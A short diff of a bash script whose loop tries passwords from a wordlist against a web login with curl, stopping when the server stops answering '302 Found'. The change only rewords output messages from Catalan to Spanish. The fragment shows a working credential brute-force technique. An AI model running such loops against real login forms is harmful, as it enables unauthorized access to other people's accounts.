@@ -54,11 +54,10 @@ while [ $start -le $total ]
     test=$(awk "NR==$start{print $1}" $document)
     if ! [[ $(curl -i -s -d "username=$username&password=$test" $URL | grep -e "302 Found") ]]
     then
-        echo -e "La contrasenya és $test"
         password=$test
         break 1
     fi
     ((start = start + 1))
 done
-echo -e "L'usuari es $usuari y la seva password es $password"
+echo -e "El usuario es $usuari y su contraseña és $password"
 }
